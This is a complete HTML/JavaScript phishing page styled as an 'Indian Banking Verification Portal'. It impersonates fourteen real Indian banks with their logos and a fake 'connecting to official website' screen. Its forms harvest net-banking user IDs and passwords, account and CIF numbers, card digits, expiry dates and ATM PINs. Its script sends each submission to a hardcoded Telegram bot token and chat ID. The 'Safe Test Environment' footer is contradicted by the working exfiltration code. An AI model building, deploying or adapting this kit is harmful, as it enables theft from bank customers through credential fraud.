<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Indian Banking Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);background-size:400% 400%;animation:gradientBG 15s ease infinite;min-height:100vh;color:#fff;overflow-x:hidden;padding:20px;}
@keyframes gradientBG{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
.header{text-align:center;margin:20px 0 30px;}
.header h1{font-size:32px;font-weight:700;text-shadow:0 3px 12px rgba(0,0,0,0.6);margin-bottom:10px;}
.header p{font-size:16px;opacity:0.8;max-width:600px;margin:auto;}
.container{width:100%;max-width:900px;backdrop-filter:blur(24px);padding:30px;border-radius:25px;display:flex;flex-direction:column;align-items:center;background:rgba(0,0,0,0.2);box-shadow:0 8px 32px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);margin-bottom:30px;}
.search{margin-bottom:20px;width:100%;position:relative;}
.search input{width:100%;padding:16px 16px 16px 45px;border-radius:14px;border:none;outline:none;font-size:16px;background:rgba(255,255,255,0.9);color:#333;box-shadow:inset 0 6px 14px rgba(0,0,0,0.25),inset 0 -4px 8px rgba(255,255,255,0.3);transition:0.3s;}
.search input:focus{transform:scale(1.02);box-shadow:inset 0 6px 18px rgba(0,0,0,0.35),inset 0 -4px 10px rgba(255,255,255,0.45);}
.search i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#555;}
.bank-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:20px;width:100%;max-height:400px;overflow-y:auto;padding:10px;margin-top:10px;}
.bank-list::-webkit-scrollbar{width:8px;}
.bank-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.25);border-radius:8px;}
.bank-list::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.45);}
.bank-item{display:flex;flex-direction:column;align-items:center;gap:12px;padding:20px;border-radius:20px;background:rgba(255,255,255,0.08);cursor:pointer;transition:0.5s;backdrop-filter:blur(16px);box-shadow:0 6px 25px rgba(0,0,0,0.5);position:relative;text-align:center;}
.bank-item::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;border-radius:20px;opacity:0;box-shadow:0 0 25px rgba(255,255,255,0.5);transition:0.5s;}
.bank-item:hover::after{opacity:1;}
.bank-item:hover{transform:scale(1.05);box-shadow:0 12px 35px rgba(255,255,255,0.3),0 12px 40px rgba(0,0,0,0.6);}
.bank-item img{width:80px;height:80px;object-fit:contain;border-radius:50%;background:#fff;padding:8px;transition:0.4s;box-shadow:0 4px 10px rgba(0,0,0,0.2);}
.bank-item span{font-weight:700;font-size:14px;color:#fff;text-shadow:0 2px 4px rgba(0,0,0,0.5);} /* Made bank names bold */

#options{display:none;width:100%;height:100vh;flex-direction:column;align-items:center;justify-content:flex-start;animation:fadeIn 0.5s;padding:20px 0;position:fixed;top:0;left:0;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);z-index:100;overflow-y:auto;}
.back-button{position:absolute;top:20px;left:20px;background:rgba(255,255,255,0.1);border:none;color:white;width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:0.3s;font-size:20px;}
.back-button:hover{background:rgba(255,255,255,0.2);transform:scale(1.1);}
.bank-header{display:flex;flex-direction:column;align-items:center;margin-bottom:20px;}
.bank-header img{width:100px;height:100px;object-fit:contain;border-radius:50%;background:#fff;padding:10px;box-shadow:0 6px 20px rgba(0,0,0,0.3);margin-bottom:15px;}
.bank-header span{font-weight:700;font-size:20px;text-shadow:0 2px 4px rgba(0,0,0,0.5);} /* Made modal bank name bold */
.tab-buttons{display:flex;justify-content:center;gap:20px;margin:25px 0 15px;width:80%;max-width:500px;position:relative;flex-wrap:wrap;}
.tab-buttons button{flex:1;padding:16px;border:none;border-radius:15px;background:rgba(255,255,255,0.15);color:#fff;font-weight:600;cursor:pointer;transition:0.3s;box-shadow:0 5px 18px rgba(0,0,0,0.4);position:relative;z-index:1;}
.tab-buttons button.active{background:linear-gradient(135deg,#ffca28,#ffd95c);color:#333;box-shadow:0 8px 25px rgba(0,0,0,0.6);}
.form-section{display:none;animation:fadeIn 0.5s;width:80%;max-width:500px;}
.form-section.active{display:block;}
form{display:flex;flex-direction:column;gap:20px;margin-top:20px;}
.input-group{position:relative;}
.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#555;z-index:2;}
.input-group input{padding:18px 18px 18px 45px;width:100%;box-sizing:border-box;border-radius:14px;border:none;outline:none;font-size:16px;background:rgba(255,255,255,0.95);color:#333;box-shadow:inset 0 6px 18px rgba(0,0,0,0.25), inset 0 -4px 10px rgba(255,255,255,0.35);transition:0.3s;}
.input-group input:focus{transform:scale(1.02);box-shadow:inset 0 6px 24px rgba(0,0,0,0.35), inset 0 -4px 12px rgba(255,255,255,0.45);}
.password-toggle{position:absolute;right:18px;top:50%;transform:translateY(-50%);color:#555;cursor:pointer;z-index:2;}
button.submit-btn{background:linear-gradient(135deg,#ffca28,#ffd95c);color:#333;font-weight:700;cursor:pointer;padding:18px;border-radius:14px;border:none;transition:0.3s;box-shadow:0 8px 30px rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;gap:10px;font-size:16px;}
button.submit-btn:hover{transform:scale(1.03);box-shadow:0 12px 35px rgba(0,0,0,0.7);}
.spinner{width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#333;animation:spin 1s ease-in-out infinite;display:none;}
@keyframes spin{to{transform:rotate(360deg);}}
.error-message{color:#ff6b6b;font-size:14px;margin-top:5px;display:none;text-align:center;}
.success-message{background:rgba(46,204,113,0.15);border:1px solid rgba(46,204,113,0.5);border-radius:12px;padding:15px;margin:20px 0;text-align:center;display:none;}
.success-message i{color:#2ecc71;margin-right:8px;}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}

/* New Loading Screen Styles */
#loading-screen {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
  display: none;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  transition: opacity 0.5s ease;
}

.loading-logo {
  width: 120px;
  height: 120px;
  object-fit: contain;
  border-radius: 50%;
  background: #fff;
  padding: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  margin-bottom: 30px;
  animation: pulse 2s infinite;
}

.loading-text {
  font-size: 22px;
  font-weight: 700; /* Made loading text bold */
  margin-bottom: 20px;
  text-align: center;
  max-width: 80%;
  text-shadow: 0 2px 4px rgba(0,0,0,0.5);
}

.connecting-animation {
  display: flex;
  gap: 10px;
  margin-top: 20px;
}

.connecting-dot {
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background: #ffca28;
  animation: bounce 1.5s infinite ease-in-out;
}

.connecting-dot:nth-child(2) {
  animation-delay: 0.2s;
}

.connecting-dot:nth-child(3) {
  animation-delay: 0.4s;
}

@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.05); }
  100% { transform: scale(1); }
}

@keyframes bounce {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-15px); }
}

.footer{text-align:center;margin-top:20px;font-size:14px;opacity:0.7;}
@media(max-width:768px){.container{width:95%;padding:20px;}.bank-list{grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:15px;}.tab-buttons,.form-section{width:95%;}.header h1{font-size:28px;}.header p{font-size:14px;}.tab-buttons{flex-direction:column;}.input-group input{padding:16px 16px 16px 45px;}.bank-item img{width:70px;height:70px;}.bank-header img{width:90px;height:90px;}.loading-logo{width: 100px;height: 100px;}.loading-text{font-size: 18px;}}
@media(max-width:480px){.bank-list{grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:12px;}.bank-item{padding:15px;}.bank-item img{width:60px;height:60px;}.bank-item span{font-size:12px;}.header h1{font-size:24px;}.search input{padding:14px 14px 14px 45px;font-size:14px;}.bank-header img{width:80px;height:80px;}.loading-logo{width: 80px;height: 80px;}.loading-text{font-size: 16px;}}
</style>
</head>
<body>
<div class="header">
  <h1>Indian Banking Verification Portal</h1>
  <p>Safe environment. All fields are Required.</p>
</div>
<div class="container">
  <div class="search">
    <i class="fas fa-search"></i>
    <input type="text" id="searchInput" placeholder="Search bank...">
  </div>
  <div class="bank-list" id="bankList"></div>
</div>

<!-- New Loading Screen -->
<div id="loading-screen">
  <img class="loading-logo" id="loading-logo" src="" alt="Bank Logo">
  <div class="loading-text" id="loading-text">Please Wait</div>
  <div class="connecting-animation">
    <div class="connecting-dot"></div>
    <div class="connecting-dot"></div>
    <div class="connecting-dot"></div>
  </div>
</div>

<div id="options">
  <button class="back-button" onclick="closeModal()"><i class="fas fa-arrow-left"></i></button>
  <div class="bank-header">
    <img id="modalLogo" src="" alt="Bank Logo">
    <span id="modalName"></span>
  </div>
  <div class="tab-buttons">
    <button class="active" onclick="showTab('internet')">Internet Banking</button>
    <button onclick="showTab('account')">Bank Account</button>
  </div>
  <div class="form-section active" id="internetFormSection">
    <form id="internetForm">
      <div class="input-group"><i class="fas fa-user"></i><input type="text" placeholder="User ID" required></div>
      <div class="input-group"><i class="fas fa-lock"></i><input type="password" placeholder="Password" required></div>
      <button type="submit" class="submit-btn">Submit <div class="spinner" id="spinner1"></div></button>
      <div class="error-message">Error sending data</div>
      <div class="success-message"><i class="fas fa-check-circle"></i> Data sent successfully!</div>
    </form>
  </div>
  <div class="form-section" id="accountFormSection">
    <form id="accountForm">
      <div class="input-group"><i class="fas fa-bank"></i><input type="text" placeholder="Account Number" pattern="\d{10,18}" required></div>
      <div class="input-group"><i class="fas fa-id-card"></i><input type="text" placeholder="CIF/Customer I'D" pattern="\d{6,12}" required></div>
      <div class="input-group"><i class="fas fa-credit-card"></i><input type="text" placeholder="Debit Last 6 Digits" pattern="\d{6}" required></div>
      <div class="input-group"><i class="fas fa-calendar"></i><input type="text" placeholder="Expiry MM/YY" pattern="\d{2}/\d{2}" required></div>
      <div class="input-group"><i class="fas fa-building"></i><input type="text" placeholder="Branch Code" pattern="\d{3,6}" required></div>
      <div class="input-group"><i class="fas fa-lock"></i><input type="text" placeholder="ATM PIN" pattern="\d{3,6}" required></div>
      <button type="submit" class="submit-btn">Submit <div class="spinner" id="spinner2"></div></button>
      <div class="error-message">Error sending data</div>
      <div class="success-message"><i class="fas fa-check-circle"></i> Data sent successfully!</div>
    </form>
  </div>
</div>
<script>
const BOT_TOKEN = "8353007176:AAGsexdDdHiNLNMSkRFDCe5VKWMRCFGBgRY";
const CHAT_ID = "7155441629";
const banks=[
  {name:"State Bank of India",logo:"https://logo.clearbit.com/sbi.co.in"},
  {name:"HDFC Bank",logo:"https://logo.clearbit.com/hdfcbank.com"},
  {name:"ICICI Bank",logo:"https://logo.clearbit.com/icicibank.com"},
  {name:"Axis Bank",logo:"https://cdn.brandfetch.io/id78YVtrRp/theme/dark/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B"},
  {name:"Punjab National Bank",logo:"https://logo.clearbit.com/pnbindia.in"},
  {name:"Bank of Baroda",logo:"https://logo.clearbit.com/bobfinancial.com"},
  {name:"Kotak Mahindra Bank",logo:"https://logo.clearbit.com/kotak.com"},
  {name:"IndusInd Bank",logo:"https://logo.clearbit.com/indusind.com"},
  {name:"Yes Bank",logo:"https://logo.clearbit.com/yesbank.in"},
  {name:"IDFC First Bank",logo:"https://logo.clearbit.com/idfcfirstbank.com"},
  {name:"Union Bank of India",logo:"https://logo.clearbit.com/unionbankofindia.co.in"},
  {name:"Canara Bank",logo:"https://logo.clearbit.com/canarabank.com"},
  {name:"Bank of India",logo:"https://logo.clearbit.com/bankofindia.co.in"},
  {name:"Federal Bank",logo:"https://logo.clearbit.com/federalbank.co.in"}
];

// Initialize the bank list
const bankList = document.getElementById("bankList");
banks.forEach(b => {
  const div = document.createElement("div");
  div.className = "bank-item";
  div.innerHTML = `<img src="${b.logo}" alt="${b.name}" onerror="this.src='https://via.placeholder.com/80?text=Bank'"><span>${b.name}</span>`;
  div.onclick = () => openModal(b);
  bankList.appendChild(div);
});

// Search functionality
document.getElementById("searchInput").addEventListener("input", function() {
  const val = this.value.toLowerCase();
  Array.from(bankList.children).forEach(item => {
    item.style.display = item.innerText.toLowerCase().includes(val) ? "flex" : "none";
  });
});

// Modal functions
function openModal(bank) {
  // Hide the main container immediately
  document.querySelector(".container").style.display = "none";
  
  // Show loading screen
  const loadingScreen = document.getElementById("loading-screen");
  const loadingLogo = document.getElementById("loading-logo");
  const loadingText = document.getElementById("loading-text");
  
  loadingLogo.src = bank.logo;
  loadingLogo.onerror = function() {
    this.src = 'https://via.placeholder.com/120?text=Bank';
  };
  loadingText.textContent = `Please Wait - Connecting To ${bank.name} Official Website`;
  
  loadingScreen.style.display = "flex";
  
  // After 3 seconds, show the options modal
  setTimeout(() => {
    loadingScreen.style.display = "none";
    
    document.getElementById("options").style.display = "flex";
    document.getElementById("modalLogo").src = bank.logo;
    document.getElementById("modalName").innerText = bank.name;
    showTab('internet');
  }, 3000);
}

function closeModal() {
  document.getElementById("options").style.display = "none";
  // Show the main container again
  document.querySelector(".container").style.display = "flex";
  // Reset forms when closing modal
  document.getElementById("internetForm").reset();
  document.getElementById("accountForm").reset();
  // Hide any messages
  document.querySelectorAll(".error-message, .success-message").forEach(el => {
    el.style.display = "none";
  });
}

function showTab(tab) {
  document.querySelectorAll(".tab-buttons button").forEach(b => b.classList.remove("active"));
  document.querySelectorAll(".form-section").forEach(f => f.classList.remove("active"));
  
  if (tab === "internet") {
    document.querySelector(".tab-buttons button:nth-child(1)").classList.add("active");
    document.getElementById("internetFormSection").classList.add("active");
  } else {
    document.querySelector(".tab-buttons button:nth-child(2)").classList.add("active");
    document.getElementById("accountFormSection").classList.add("active");
  }
}

// Form handling
async function handleForm(form) {
  form.addEventListener("submit", async e => {
    e.preventDefault();
    const submitBtn = form.querySelector(".submit-btn");
    const spinner = form.querySelector(".spinner");
    const error = form.querySelector(".error-message");
    const success = form.querySelector(".success-message");
    
    submitBtn.disabled = true; 
    spinner.style.display = "inline-block"; 
    error.style.display = "none"; 
    success.style.display = "none";
    
    let data = {};
    Array.from(form.querySelectorAll("input")).forEach(i => {
      data[i.placeholder] = i.value;
    });
    
    data["Bank Name"] = document.getElementById("modalName").innerText;
    data["Timestamp"] = new Date().toLocaleString("en-IN", {timeZone: "Asia/Kolkata"});
    
    try {
      // Format the message for Telegram
      let message = "🔔 *New Bank Verification Request* 🔔\n\n";
      for (const [key, value] of Object.entries(data)) {
        message += `*${key}:* ${value}\n`;
      }
      
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
      
      const result = await response.json();
      
      if (result.ok) {
        success.style.display = "block";
        form.reset();
        
        // Close modal after 2 seconds
        setTimeout(() => {
          closeModal();
        }, 2000);
      } else {
        throw new Error(result.description || "Failed to send message");
      }
    } catch (err) {
      console.error("Error:", err);
      error.textContent = "Error: " + (err.message || "Failed to send data");
      error.style.display = "block";
    } finally {
      spinner.style.display = "none";
      submitBtn.disabled = false;
    }
  });
}

// Initialize form handlers
handleForm(document.getElementById("internetForm"));
handleForm(document.getElementById("accountForm"));
</script>
<div class="footer">Demo Portal | Safe Test Environment</div>
</body>
</html>
